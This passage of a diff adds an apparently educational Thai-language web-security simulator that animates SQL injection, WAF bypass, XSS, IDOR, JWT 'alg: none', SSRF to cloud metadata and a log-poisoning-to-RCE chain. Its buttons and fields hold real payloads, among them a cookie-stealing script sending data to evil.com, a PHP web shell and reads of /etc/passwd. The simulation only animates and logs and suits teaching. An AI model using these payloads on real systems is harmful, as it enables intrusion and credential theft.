+                    <button class="btn-ctrl btn-warn" onclick="testWafPacket(2)">
+                        <span>🥷</span> 2. ใช้คอมเมนต์คั่น (SELECT/**/password/**/FROM/**/users) ➔ บินทะลุ WAF!
+                    </button>
+                    <button class="btn-ctrl btn-success" onclick="testWafPacket(3)">
+                        <span>🧙</span> 3. สลับตัวพิมพ์ + Encode (sElEcT%20password) ➔ บินฉลุยถึง Server!
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term3">
+                    <div class="inspector-head"><span>WAF PACKET MONITOR</span><span>OWASP CRS</span></div>
+                    <div class="log-row"><span class="log-time">[WAF]</span> Deep Packet Inspection active. Monitoring headers & query strings.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 4: Injection Attacks -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view4">
+            <div class="hero-banner">
+                <div class="hero-title">💉 Module 5: Injection Attacks - แพ็กเก็ตสอดไส้คำสั่งประมวลผล</div>
+                <div class="hero-text">
+                    เมื่อแพ็กเก็ตมีคำสั่ง SQL หรือคำสั่ง OS สอดไส้อยู่ และเซิร์ฟเวอร์นำไปต่อสตริงตรงๆ:
+                    <br>• <strong>Union SQLi:</strong> แพ็กเก็ตสั่งให้ฐานข้อมูลรวมข้อมูลตารางลับส่งกลับมา
+                    <br>• <strong>Time-Based Blind:</strong> แพ็กเก็ตสั่งให้ฐานข้อมูลหยุดรอ <span class="code-tag">SLEEP(3)</span> ก่อนตอบกลับ เพื่อพิสูจน์ช่องโหว่
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 SQL Injection Database Roundtrip Flight</div>
+                    <span class="stage-badge">RDBMS Execution</span>
+                </div>
+
+                <div class="packet-highway" id="highway4">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt4">📄 Search: id=1</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n4-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">HTTP Request</div>
+                            <span class="station-status" id="st4-client">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="n4-server">
+                            <div class="station-icon">⚙️</div>
+                            <div class="station-name">PHP Server</div>
+                            <div class="station-meta">PDO Query</div>
+                            <span class="station-status" id="st4-server">Process</span>
+                        </div>
+
+                        <div class="station-node" id="n4-db">
+                            <div class="station-icon">🗄️</div>
+                            <div class="station-name">MySQL Database</div>
+                            <div class="station-meta">table: users</div>
+                            <span class="station-status" id="st4-db">Status: OK</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">พารามิเตอร์ SQL ในแพ็กเก็ต (GET /item?id=...):</label>
+                    <input type="text" id="sqliInputParam" class="payload-box" value="1' UNION SELECT 1,username,password FROM users--" onkeydown="if(event.key==='Enter') runCustomSqli()">
+                    <button class="btn-ctrl btn-danger" onclick="runCustomSqli()" style="padding: 8px 16px; font-size: 0.88rem;">
+                        <span>💥</span> ยิงคำสั่ง SQL นี้
+                    </button>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="runSqliPacket(1)">
+                        <span>🔍</span> 1. แพ็กเก็ตปกติ (id=1) ➔ ได้ข้อมูลสินค้า
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runSqliPacket(2)">
+                        <span>💥</span> 2. แพ็กเก็ต Union SQLi ➔ ดึงรหัสผ่าน Admin จาก Database!
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="runSqliPacket(3)">
+                        <span>⏱️</span> 3. แพ็กเก็ต Time-Based (SLEEP 3s) ➔ นับถอยหลังฐานข้อมูลหลับ 3 วินาที
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term4">
+                    <div class="inspector-head"><span>DATABASE RESPONSE LOG</span><span>DBMS: MySQL 8.0</span></div>
+                    <div class="log-row"><span class="log-time">[DB]</span> Connection open. Ready to receive SQL queries.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 5: XSS Script Injection -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="viewXSS">
+            <div class="hero-banner">
+                <div class="hero-title">🧬 Module 6: XSS - แพ็กเก็ตแฝงสคริปต์ ทำงานในเบราว์เซอร์ของเหยื่อ</div>
+                <div class="hero-text">
+                    ต่างจาก SQLi ที่โจมตี "เซิร์ฟเวอร์" ช่องโหว่ <strong>XSS (Cross-Site Scripting)</strong> คือการฝังโค้ด JavaScript ลงในหน้าเว็บ แล้วให้ "เบราว์เซอร์ของเหยื่อ" เป็นคนรันโค้ดนั้นเอง:
+                    <br>• <strong>Stored XSS:</strong> เพย์โหลดถูกบันทึกไว้ในเซิร์ฟเวอร์ถาวร (เช่น ช่องคอมเมนต์) ทุกคนที่เปิดหน้านั้นจะโดนรันสคริปต์
+                    <br>• <strong>Reflected XSS:</strong> เพย์โหลดอยู่ใน URL ต้องหลอกให้เหยื่อคลิกลิงก์ก่อน สคริปต์ถึงจะสะท้อนกลับมารัน
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 XSS Payload Flight: Attacker ➔ Comment Server ➔ Victim's Browser</div>
+                    <span class="stage-badge">Client-Side Execution</span>
+                </div>
+
+                <div class="packet-highway" id="highwayxss">
+                    <div class="wire-track"></div>
+
+                    <div class="travel-packet" id="pktxss">💬 Comment: "Nice post!"</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="nxss-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">POST /comment</div>
+                            <span class="station-status" id="stxss-client">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="nxss-server">
+                            <div class="station-icon">📝</div>
+                            <div class="station-name">Comment Board Server</div>
+                            <div class="station-meta">No Output Encoding</div>
+                            <span class="station-status" id="stxss-server">Stored: 0 comments</span>
+                        </div>
+
+                        <div class="station-node" id="nxss-victim">
+                            <div class="station-icon">🙍</div>
+                            <div class="station-name">Victim's Browser</div>
+                            <div class="station-meta">Viewing page</div>
+                            <span class="station-status" id="stxss-victim">Cookie: safe</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">กล่องเขียนความคิดเห็น (ลองพิมพ์ข้อความปกติ หรือเพย์โหลด &lt;script&gt;alert('XSS')&lt;/script&gt;):</label>
+                    <input type="text" id="xssInputComment" class="payload-box" placeholder="พิมพ์ข้อความคอมเมนต์ หรือใส่ &lt;script&gt;...&lt;/script&gt; ที่นี่..." onkeydown="if(event.key==='Enter') submitCustomXss()">
+                    <button class="btn-ctrl btn-danger" onclick="submitCustomXss()" style="padding: 8px 16px; font-size: 0.88rem;">
+                        <span>💬</span> โพสต์คอมเมนต์
+                    </button>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="runXssPacket(1)">
+                        <span>💬</span> 1. ส่งคอมเมนต์ปกติ "Nice post!" ➔ แสดงผลปกติ
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runXssPacket(2)">
+                        <span>🧬</span> 2. Stored XSS: &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt; ➔ ขโมย Cookie ทุกคนที่เปิดหน้า!
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="runXssPacket(3)">
+                        <span>🔗</span> 3. Reflected XSS: ?search=&lt;script&gt;alert(document.cookie)&lt;/script&gt; ➔ ต้องหลอกเหยื่อคลิกลิงก์ก่อน
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="termxss">
+                    <div class="inspector-head"><span>BROWSER CONSOLE (VICTIM SIDE)</span><span>STATUS: READY</span></div>
+                    <div class="log-row"><span class="log-time">[Init]</span> Comment board loaded. No input sanitisation detected on server.</div>
+                </div>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-card">
+                    <div class="card-head">📜 OWASP Top 10</div>
+                    <div class="card-body">XSS จัดอยู่ใน A03: Injection เช่นเดียวกับ SQLi เพราะหลักการเดียวกันคือ "ข้อมูลที่ไม่น่าเชื่อถือถูกนำไปรันเป็นโค้ด" ต่างกันแค่ฝั่งที่รัน (เบราว์เซอร์ vs เซิร์ฟเวอร์)</div>
+                </div>
+                <div class="info-card">
+                    <div class="card-head">🛡️ วิธีป้องกัน</div>
+                    <div class="card-body">Output Encoding (escape ค่าก่อนแสดงผลบนหน้าเว็บ), Content-Security-Policy (CSP) header, และตั้งค่า Cookie เป็น HttpOnly เพื่อกันไม่ให้ JavaScript อ่าน cookie ได้</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 6: AuthN, IDOR & JWT -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view5">
+            <div class="hero-banner">
+                <div class="hero-title">🔑 Module 7: IDOR & JWT - การสลับป้ายชื่อบนแพ็กเก็ต (Privilege Escalation)</div>
+                <div class="hero-text">
+                    • <strong>IDOR:</strong> แพ็กเก็ตถูกแก้ไขพารามิเตอร์จาก <span class="code-tag">id=105</span> เป็น <span class="code-tag">id=1</span> เซิร์ฟเวอร์ที่ไม่มีการตรวจสิทธิ์จะส่งข้อมูลของ SuperAdmin กลับมาทันที!
+                    <br>• <strong>JWT Attacks:</strong> แก้ไข Header ภายในแพ็กเก็ตเป็น <span class="code-tag">"alg": "none"</span> เพื่อข้ามการตรวจลายเซ็นดิจิทัล
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 IDOR Parameter Tampering & Data Exfiltration Track</div>
+                    <span class="stage-badge">REST API AuthZ Flaw</span>
+                </div>
+
+                <div class="packet-highway" id="highway5">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt5">👤 GET /profile?id=105</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n5-client">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">User ID: 105</div>
+                            <span class="station-status" id="st5-client">Balance: $150</span>
+                        </div>
+
+                        <div class="station-node" id="n5-server">
+                            <div class="station-icon">🏦</div>
+                            <div class="station-name">Banking API</div>
+                            <div class="station-meta">No AuthZ Check</div>
+                            <span class="station-status">Lookup ID</span>
+                        </div>
+
+                        <div class="station-node" id="n5-vault">
+                            <div class="station-icon">👑</div>
+                            <div class="station-name">SuperAdmin (id: 1)</div>
+                            <div class="station-meta">Role: Admin</div>
+                            <span class="station-status" id="st5-vault">Balance: $10M</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">ระบุ User ID ในพารามิเตอร์แพ็กเก็ต (GET /profile?id=...):</label>
+                    <input type="number" id="idorInputId" class="payload-box" value="105" min="1" max="999" style="max-width:140px;" onkeydown="if(event.key==='Enter') testCustomIdor()">
+                    <button class="btn-ctrl btn-warn" onclick="testCustomIdor()" style="padding: 8px 16px; font-size: 0.88rem;">
+                        <span>👤</span> ดึงข้อมูลตาม ID นี้
+                    </button>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="testIdorPacket(105)">
+                        <span>👤</span> 1. ส่งแพ็กเก็ต id=105 ➔ ดูข้อมูลตัวเอง (Normal)
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="testIdorPacket(1)">
+                        <span>💰</span> 2. IDOR Exploit: สลับเป็น id=1 ➔ ดึงข้อมูลบัญชี SuperAdmin ($10,000,000)!
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="testIdorPacket(99)">
+                        <span>📜</span> 3. สลับเป็น id=99 ➔ ดึงบันทึกรายงานลับของผู้จัดการ
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runJwtPacket()">
+                        <span>🔏</span> 4. JWT Attack: แก้ Header เป็น "alg": "none" ➔ Bypass ลายเซ็นเป็น SuperAdmin!
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term5">
+                    <div class="inspector-head"><span>JSON PACKET PAYLOAD</span><span>STATUS: 200 OK</span></div>
+                    <div class="log-row"><span class="log-time">[API]</span> Valid session. Querying record based on client-supplied ID.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 7: SSRF Internal Relay -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view6">
+            <div class="hero-banner">
+                <div class="hero-title">🚀 Module 8: SSRF - การสั่งให้เซิร์ฟเวอร์ส่งแพ็กเก็ตเข้าไปในเครือข่ายภายใน</div>
+                <div class="hero-text">
+                    แฮกเกอร์ภายนอกไม่สามารถเข้าถึง Cloud Metadata หรือ Localhost ได้โดยตรง จึงส่งแพ็กเก็ตไปสั่งเซิร์ฟเวอร์ว่า <span class="code-tag">url=http://169.254.169.254/latest/meta-data/</span> ทำให้เซิร์ฟเวอร์กลายเป็น <strong>สะพานส่งแพ็กเก็ตภายใน (SSRF Relay)</strong> เดินไปดูดกุญแจ AWS IAM ลับออกมาให้เรา!
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 SSRF Internal Packet Relay Track</div>
+                    <span class="stage-badge">Cloud Metadata 169.254.169.254</span>
+                </div>
+
+                <div class="packet-highway" id="highway6">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt6">📡 GET /fetch?url=...</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n6-attacker">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">Public Internet</div>
+                            <span class="station-status" id="st6-attacker">Ready</span>
+                        </div>
+
+                        <div class="station-node" id="n6-server">
+                            <div class="station-icon">⚙️</div>
+                            <div class="station-name">Web Server</div>
+                            <div class="station-meta">cURL Fetcher</div>
+                            <span class="station-status" id="st6-server">Relaying</span>
+                        </div>
+
+                        <div class="station-node" id="n6-cloud">
+                            <div class="station-icon">☁️</div>
+                            <div class="station-name">AWS Metadata</div>
+                            <div class="station-meta">169.254.169.254</div>
+                            <span class="station-status" id="st6-cloud">IAM Secret</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">ระบุ URL ที่จะสั่งให้เซิร์ฟเวอร์ยิง cURL ไปดึงข้อมูล (SSRF Relay Target):</label>
+                    <input type="text" id="ssrfInputUrl" class="payload-box" value="http://169.254.169.254/latest/meta-data/" onkeydown="if(event.key==='Enter') testCustomSsrf()">
+                    <button class="btn-ctrl btn-danger" onclick="testCustomSsrf()" style="padding: 8px 16px; font-size: 0.88rem;">
+                        <span>📡</span> สั่งเซิร์ฟเวอร์ Fetch
+                    </button>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-success" onclick="runSsrfPacket(false)">
+                        <span>🖼️</span> 1. สั่งโหลดรูปปกติ (url=https://cdn.site/logo.png)
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runSsrfPacket(true)">
+                        <span>🔥</span> 2. ยิง SSRF Packet (url=http://169.254.169.254/latest/meta-data/) ➔ ได้กุญแจ AWS!
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="testCustomSsrf('http://localhost:8080/admin')">
+                        <span>🚪</span> 3. ยิงเข้า Local Admin (url=http://localhost:8080/admin)
+                    </button>
+                    <button class="btn-ctrl btn-warn" onclick="testCustomSsrf('http://127.0.0.1:6379/info')">
+                        <span>🗄️</span> 4. ยิงเข้า Internal Redis (url=http://127.0.0.1:6379)
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term6">
+                    <div class="inspector-head"><span>cURL RELAY STREAM</span><span>INTERNAL NETWORK</span></div>
+                    <div class="log-row"><span class="log-time">[cURL]</span> Ready to fetch external and internal resources.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 8: Chained Attack Flow -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view7">
+            <div class="hero-banner">
+                <div class="hero-title">⚡ Module 9: Chained Attacks - มหาเวทคอมโบส่งแพ็กเก็ต 2 จังหวะสู่ RCE</div>
+                <div class="hero-text">
+                    การรวมท่าไม้ตายเพื่อให้ได้ <strong>Remote Code Execution (RCE)</strong> ยึดเครื่องเซิร์ฟเวอร์:
+                    <br>• <strong>Packet 1 (Poisoning):</strong> ส่งแพ็กเก็ตฝังโค้ด PHP Shell ใน User-Agent เข้าไปใน <span class="code-tag">access.log</span>
+                    <br>• <strong>Packet 2 (Triggering):</strong> ส่งแพ็กเก็ต LFI สั่งให้ PHP Compile ไฟล์ Log นั้น ➔ ได้สิทธิ์ควบคุม Root Shell ทันที!
+                </div>
+            </div>
+
+            <div class="packet-stage-card">
+                <div class="stage-header">
+                    <div class="stage-title">🎬 Two-Stage Chained Packet Flight: Log Poisoning ➔ LFI Trigger ➔ RCE</div>
+                    <span class="stage-badge">RCE Weaponization</span>
+                </div>
+
+                <div class="packet-highway" id="highway7">
+                    <div class="wire-track"></div>
+                    
+                    <div class="travel-packet" id="pkt7">🧪 User-Agent: &lt;?php system(...) ?&gt;</div>
+
+                    <div class="nodes-layer">
+                        <div class="station-node" id="n7-attacker">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">Attacker Client</div>
+                            <div class="station-meta">Crafted Shell</div>
+                            <span class="station-status" id="st7-attacker">Stage 1 / 2</span>
+                        </div>
+
+                        <div class="station-node" id="n7-log">
+                            <div class="station-icon">📒</div>
+                            <div class="station-name">access.log</div>
+                            <div class="station-meta">/var/log/apache2/</div>
+                            <span class="station-status" id="st7-log">Raw Text</span>
+                        </div>
+
+                        <div class="station-node" id="n7-server">
+                            <div class="station-icon">💻</div>
+                            <div class="station-name">PHP Engine (LFI)</div>
+                            <div class="station-meta">include($_GET['page']);</div>
+                            <span class="station-status" id="st7-server">Vulnerable</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="payload-edit-bar">
+                    <label style="color:var(--amber); font-size:0.85rem; width:100%;">คำสั่ง Command ที่ต้องการรันผ่าน Web Shell ใน Step 2:</label>
+                    <input type="text" id="comboInputCmd" class="payload-box" value="whoami" style="max-width:200px;">
+                    <span style="font-size:0.82rem; color:var(--text-sub);">(ตัวอย่าง: whoami, id, uname -a, cat /etc/passwd)</span>
+                </div>
+
+                <div class="controls-panel">
+                    <button class="btn-ctrl btn-warn" onclick="runComboPacket(1)">
+                        <span>1️⃣</span> Step 1: ยิงแพ็กเก็ตฝัง PHP Shell ใส่ Log (User-Agent: &lt;?php system($_GET['cmd']); ?&gt;)
+                    </button>
+                    <button class="btn-ctrl btn-danger" onclick="runComboPacket(2)">
+                        <span>2️⃣</span> Step 2: ยิงแพ็กเก็ต LFI จุดชนวนไฟล์ Log (?page=access.log&cmd=...) ➔ ได้ RCE!
+                    </button>
+                    <button class="btn-ctrl btn-success" onclick="runComboReset()">
+                        <span>🔄</span> รีเซ็ตสถานะ Log & เซิร์ฟเวอร์
+                    </button>
+                </div>
+
+                <div class="inspector-box" id="term7">
+                    <div class="inspector-head"><span>EXPLOIT CHAIN CONSOLE</span><span>TARGET: RCE</span></div>
+                    <div class="log-row"><span class="log-time">[Chain]</span> Multi-stage sequence ready. Trigger Step 1.</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ================================================================= -->
+        <!-- TAB 9: Exam Challenge Quiz -->
+        <!-- ================================================================= -->
+        <section class="module-view" id="view8">
+            <div class="quiz-wrapper">
+                <div style="font-size: 3rem; margin-bottom: 8px;">🏆</div>
+                <h2 style="font-size: 1.4rem; color: #38bdf8; margin-bottom: 6px;">Web-RTA Certification Knowledge Check</h2>
+                <p style="color: var(--text-sub); margin-bottom: 20px; font-size: 0.92rem;">แบบทดสอบ 6 ข้อประเมินความพร้อมก่อนเริ่มฝึกปฏิบัติการ Lab จริง</p>
+
+                <div id="quizBox">
+                    <div style="background: rgba(14, 21, 38, 0.9); border: 1px solid var(--border); border-radius: 12px; padding: 24px; max-width: 720px; margin: 0 auto; text-align: left;">
+                        <div id="quizProgress" class="quiz-progress"></div>
+                        <div id="quizQuestionText" style="font-size: 1.05rem; font-weight: 600; margin-bottom: 16px; color: var(--amber); line-height: 1.6;"></div>
+                        <div id="quizOptionsContainer"></div>
+                        <div id="quizFeedbackArea" style="display:none;"></div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </div>
+
+    <!-- Scripts & Web Audio Engine -->
+    <script>
+        let audioCtx = null;
+        let soundEnabled = true;
+
+        function initAudio() {
+            if (!audioCtx) {
+                audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            }
+        }
+
+        function playSound(type) {
+            if (!soundEnabled) return;
+            try {
+                initAudio();
+                if (audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
+
+                const now = audioCtx.currentTime;
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+
+                if (type === 'whoosh') {
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(280, now);
+                    osc.frequency.exponentialRampToValueAtTime(750, now + 0.16);
+                    gain.gain.setValueAtTime(0.18, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.16);
+                    osc.start(now);
+                    osc.stop(now + 0.16);
+                } else if (type === 'success') {
+                    osc.type = 'triangle';
+                    osc.frequency.setValueAtTime(523.25, now);
+                    osc.frequency.setValueAtTime(659.25, now + 0.08);
+                    osc.frequency.setValueAtTime(783.99, now + 0.16);
+                    gain.gain.setValueAtTime(0.2, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.28);
+                    osc.start(now);
+                    osc.stop(now + 0.28);
+                } else if (type === 'danger') {
+                    osc.type = 'sawtooth';
+                    osc.frequency.setValueAtTime(160, now);
+                    osc.frequency.linearRampToValueAtTime(70, now + 0.25);
+                    gain.gain.setValueAtTime(0.22, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.25);
+                    osc.start(now);
+                    osc.stop(now + 0.25);
+                } else if (type === 'beep') {
+                    osc.type = 'sine';
+                    osc.frequency.setValueAtTime(880, now);
+                    gain.gain.setValueAtTime(0.1, now);
+                    gain.gain.linearRampToValueAtTime(0.01, now + 0.06);
+                    osc.start(now);
+                    osc.stop(now + 0.06);
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        }
+
+        function toggleAudio() {
+            soundEnabled = !soundEnabled;
+            document.getElementById('soundIcon').innerText = soundEnabled ? '🔊' : '🔇';
+            document.getElementById('soundText').innerText = soundEnabled ? 'เสียง: เปิด' : 'เสียง: ปิด';
+            if (soundEnabled) playSound('beep');
+        }
+
+        function switchModule(idx) {
+            playSound('beep');
+            const btns = document.querySelectorAll('.tab-btn');
+            const views = document.querySelectorAll('.module-view');
+            btns.forEach((b, i) => b.classList.toggle('active', i === idx));
+            views.forEach((v, i) => v.classList.toggle('active', i === idx));
+        }
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        function appendLog(termId, text, type = 'normal') {
+            const term = document.getElementById(termId);
+            if (!term) return;
+            const time = new Date().toLocaleTimeString('th-TH');
+            const row = document.createElement('div');
+            row.className = 'log-row';
+
+            let typeClass = '';
+            if (type === 'err') typeClass = 'log-err';
+            if (type === 'ok') typeClass = 'log-ok';
+            if (type === 'warn') typeClass = 'log-warn';
+
+            row.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">${escapeHtml(text)}</span>`;
+            term.appendChild(row);
+            term.scrollTop = term.scrollHeight;
+        }
+
+        // Sim Timeouts Manager
+        const simTimeouts = {};
+        function clearSimTimeouts(key) {
+            if (simTimeouts[key]) {
+                simTimeouts[key].forEach(t => clearTimeout(t));
+                simTimeouts[key] = [];
+            }
+        }
+        function addSimTimeout(key, fn, delay) {
+            if (!simTimeouts[key]) simTimeouts[key] = [];
+            const t = setTimeout(fn, delay);
+            simTimeouts[key].push(t);
+            return t;
+        }
+
+        // Helper to cleanly reset & spawn packet at Attacker Client (6%)
+        function spawnAtAttacker(pktId, text, isAttack) {
+            const pkt = document.getElementById(pktId);
+            if (!pkt) return;
+            pkt.style.transition = 'none';
+            pkt.style.opacity = '0';
+            pkt.style.left = '6%'; // Exact position of Attacker Client
+            pkt.className = 'travel-packet ' + (isAttack ? 'attack-packet' : '');
+            pkt.innerText = text;
+            pkt.offsetHeight; // Force instant layout reflow
+
+            // Show packet sitting at Attacker Client
+            pkt.style.transition = 'opacity 0.2s ease, left 0.75s cubic-bezier(0.25, 1, 0.5, 1)';
+            pkt.style.opacity = '1';
+        }
+
+        // =================================================================
+        // SIM 0: Packet Lifecycle
+        // =================================================================
+        function launchPacket0(isAttack) {
+            clearSimTimeouts('sim0');
+            const pkt = document.getElementById('pkt0');
+            const client = document.getElementById('n0-client');
+            const server = document.getElementById('n0-server');
+            const db = document.getElementById('n0-db');
+
+            [client, server, db].forEach(n => n.className = 'station-node');
+            
+            spawnAtAttacker('pkt0', isAttack ? '💥 GET /user?id=1\' OR 1=1--' : '✉️ GET /user?id=1', isAttack);
+            client.classList.add(isAttack ? 'danger-node' : 'active-node');
+            playSound('beep');
+            appendLog('term0', isAttack ? 'POST /api/user (Payload: id=1\' OR 1=1--)' : 'GET /api/user?id=1', isAttack ? 'err' : 'normal');
+
+            addSimTimeout('sim0', () => {
+                pkt.style.left = '50%';
+                server.classList.add(isAttack ? 'danger-node' : 'active-node');
+                playSound('whoosh');
+            }, 350);
+
+            addSimTimeout('sim0', () => {
+                pkt.style.left = '94%';
+                playSound('whoosh');
+            }, 1100);
+
+            addSimTimeout('sim0', () => {
+                if (isAttack) {
+                    db.classList.add('danger-node');
+                    document.getElementById('st0-db').innerText = 'DUMPED!';
+                    document.getElementById('st0-db').style.color = '#ef4444';
+                    playSound('danger');
+                    appendLog('term0', '🔥 [SQLi Exploit] Query evaluated to TRUE. Full table dump: [admin, hash=$2y$10$xyz, alice, bob]', 'err');
+                    
+                    pkt.className = 'travel-packet response-packet';
+                    pkt.innerText = '📦 Response: [admin, alice, bob]';
+                    addSimTimeout('sim0', () => {
+                        pkt.style.left = '6%';
+                        playSound('whoosh');
+                    }, 500);
+                    addSimTimeout('sim0', () => {
+                        client.classList.add('danger-node');
+                        pkt.style.opacity = '0';
+                    }, 1250);
+                } else {
+                    db.classList.add('success-node');
+                    document.getElementById('st0-db').innerText = '200 OK';
+                    document.getElementById('st0-db').style.color = '#10b981';
+                    playSound('success');
+                    appendLog('term0', 'HTTP/1.1 200 OK | Content-Type: application/json | {"id": 1, "username": "student_01"}', 'ok');
+
+                    pkt.className = 'travel-packet response-packet';
+                    pkt.innerText = '📦 200 OK (student_01)';
+                    addSimTimeout('sim0', () => {
+                        pkt.style.left = '6%';
+                        playSound('whoosh');
+                    }, 500);
+                    addSimTimeout('sim0', () => {
+                        client.classList.add('success-node');
+                        pkt.style.opacity = '0';
+                    }, 1250);
+                }
+            }, 1850);
+        }
+
+        // =================================================================
+        // SIM 1: Burp Suite Mid-Air Intercept
+        // =================================================================
+        let burpHeld = false;
+        function burpStep1Intercept() {
+            clearSimTimeouts('sim1');
+            const pkt = document.getElementById('pkt1');
+            const client = document.getElementById('n1-client');
+            const burp = document.getElementById('n1-burp');
+            const server = document.getElementById('n1-server');
+
+            [client, burp, server].forEach(n => n.className = 'station-node');
+            document.getElementById('st1-burp').innerText = 'Intercept: ON';
+            document.getElementById('st1-burp').style.color = '';
+            document.getElementById('burpInputPayload').value = 'POST /api/checkout HTTP/1.1 | Body: {"item_id": 501, "price": 2500}';
+
+            spawnAtAttacker('pkt1', '📦 POST /checkout price=2500', false);
+            client.classList.add('active-node');
+            playSound('beep');
+
+            addSimTimeout('sim1', () => {
+                pkt.style.left = '50%';
+                playSound('whoosh');
+            }, 300);
+
+            addSimTimeout('sim1', () => {
+                pkt.className = 'travel-packet blocked-packet';
+                burp.classList.add('danger-node');
+                document.getElementById('st1-burp').innerText = '🛑 HELD IN MEMORY';
+                document.getElementById('st1-burp').style.color = '#f59e0b';
+                playSound('beep');
+                appendLog('term1', '🛑 [Proxy Intercept] HTTP Packet caught in mid-air on 127.0.0.1:8080! Flight suspended.', 'warn');
+                burpHeld = true;
+            }, 1050);
+        }
+
+        function burpStep2Tamper() {
+            clearSimTimeouts('sim1');
+            const pkt = document.getElementById('pkt1');
+            const burp = document.getElementById('n1-burp');
+            burp.classList.add('danger-node');
+            document.getElementById('st1-burp').innerText = '🛑 HELD (Tampered)';
+            document.getElementById('st1-burp').style.color = '#ef4444';
+
+            pkt.style.transition = 'left 0.3s ease';
+            pkt.style.left = '50%';
+            pkt.style.opacity = '1';
+            pkt.className = 'travel-packet attack-packet';
+            pkt.innerText = '✏️ POST /checkout price=0';
+            playSound('beep');
+
+            document.getElementById('burpInputPayload').value = 'POST /api/checkout HTTP/1.1 | Body: {"item_id": 501, "price": 0}';
+            appendLog('term1', '✏️ [Repeater Modification] Modified packet payload "price" from 2500 to 0.', 'err');
+            burpHeld = true;
+        }
+
+        function burpStep3Forward() {
+            if (!burpHeld) {
+                appendLog('term1', '⚠️ [Proxy Notice] ยังไม่มีแพ็กเก็ตที่ถูกกักไว้! ระบบจะส่งคำขอและดักจับให้อัตโนมัติ...', 'warn');
+                burpStep1Intercept();
+                addSimTimeout('sim1', () => {
+                    burpStep3Forward();
+                }, 1200);
+                return;
